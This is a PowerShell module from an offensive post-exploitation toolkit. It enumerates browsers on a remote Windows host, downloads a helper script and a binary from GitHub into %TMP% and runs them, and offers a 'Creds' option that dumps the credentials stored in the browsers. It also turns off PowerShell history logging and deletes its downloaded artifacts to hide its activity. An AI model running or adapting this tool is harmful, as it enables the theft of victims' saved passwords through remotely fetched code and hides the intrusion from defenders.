<#
.SYNOPSIS
   Leak Installed Browsers Information

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.0.2

.NOTES
   This module downloads GetBrowsers.ps1 from venom
   GitHub repository into remote host %TMP% directory,
   to identify install browsers and run enum modules.

.Parameter GetBrowsers
   Accepts arguments: Enum, Verbose and Creds

.EXAMPLE
   PS C:\> Get-Help .\EnumBrowsers.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\EnumBrowsers.ps1 -GetBrowsers Enum
   Identify installed browsers and versions

.EXAMPLE
   PS C:\> .\EnumBrowsers.ps1 -GetBrowsers Verbose
   Run enumeration modules againts ALL installed browsers

.EXAMPLE
   PS C:\> .\EnumBrowsers.ps1 -GetBrowsers Creds
   Dump Stored credentials from all installed browsers

.OUTPUTS
   Browser   Install   Status   Version         PreDefined
   -------   -------   ------   -------         ----------
   IE        Found     Stoped   9.11.18362.0    False
   CHROME    False     Stoped   {null}          False
   FIREFOX   Found     Active   81.0.2          True
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$GetBrowsers="false"
)

If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose" -or $GetBrowsers -ieq "Creds"){
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

    If(-not(Test-Path -Path "$Env:TMP\GetBrowsers.ps1")){## Download GetBrowsers.ps1 from my GitHub repository
        Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetBrowsers.ps1 -Destination $Env:TMP\GetBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
        ## Check downloaded file integrity => FileSizeKBytes
        $SizeDump = ((Get-Item -Path "$Env:TMP\GetBrowsers.ps1" -EA SilentlyContinue).length/1KB)
        If($SizeDump -lt 59){## Corrupted download detected => DefaultFileSize: 59,4033203125/KB
           Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
           If(Test-Path -Path "$Env:TMP\GetBrowsers.ps1"){Remove-Item -Path "$Env:TMP\GetBrowsers.ps1" -Force}
           Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @EnumBrowsers
        }   
    }

    ## Detect ALL Available browsers Installed { IE, FIREFOX, CHROME }
    $RawBeacon = "HKCU:\Software\Google\" + "Chrome\BLBeacon" -Join ''
    $RawHKLMey = "HKLM:\SOFTWARE\" + "Microsoft\Internet Explorer" -join ''
    $IEVersion = (Get-ItemProperty -Path "$RawHKLMey" -EA SilentlyContinue).version
    If($IEVersion){$IEfound = "Installed"}else{$IEfound = "NotFound"}
    $Chrome_App = (Get-ItemProperty "$RawBeacon" -EA SilentlyContinue).version
    If($Chrome_App){$CHfound = "Installed"}else{$CHfound = "NotFound"}
    $FFfound = "$Env:PROGRAMFILES\Mozi" + "lla Firefox\" + "firefox.exe" -Join ''
    If(Test-Path -Path "$FFfound" -EA SilentlyContinue){$FFfound = "Installed"}else{$FFfound = "NotFound"}

    ## Run sellect modules againts installed browsers
    If($GetBrowsers -ieq "Enum"){## [ Enum ] @arg scans
        &"$Env:TMP\GetBrowsers.ps1" -RECON

    }ElseIf($GetBrowsers -ieq "Creds"){## [ Creds ] @arg scans
        &"$Env:TMP\GetBrowsers.ps1" -Creds

    }ElseIf($GetBrowsers -ieq "Verbose"){## [ Verbose ] @arg scans

        &"$Env:TMP\GetBrowsers.ps1" -RECON
        If($IEfound -ieq "Installed"){## IExplorer Found
            &"$Env:TMP\GetBrowsers.ps1" -IE
        }

        If($CHfound -ieq "Installed"){## Chrome Found
           &"$Env:TMP\GetBrowsers.ps1" -CHROME
        }

        If($FFfound -ieq "Installed"){## Firefox Found
            If(-not(Test-Path "$Env:TMP\mozlz4-win32.exe")){## Downloads binary auxiliary 
                Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/main/bin/meterpeter/mimiRatz/mozlz4-win32.exe -Destination $Env:TMP\mozlz4-win32.exe -ErrorAction SilentlyContinue|Out-Null
            }
            ## Execute GetBrowsers -FIREFOX parameter
            &"$Env:TMP\GetBrowsers.ps1" -FIREFOX
        }
    }

    ## Clean artifacts left behind
    If(Test-Path -Path "$Env:TMP\mozlz4-win32.exe"){Remove-Item -Path "$Env:TMP\mozlz4-win32.exe" -Force}
    If(Test-Path -Path "$Env:TMP\DarkRCovery.exe"){Remove-Item -Path "$Env:TMP\DarkRCovery.exe" -Force}
    If(Test-Path -Path "$Env:TMP\GetBrowsers.ps1"){Remove-Item -Path "$Env:TMP\GetBrowsers.ps1" -Force}
    Start-Sleep -Seconds 1
}
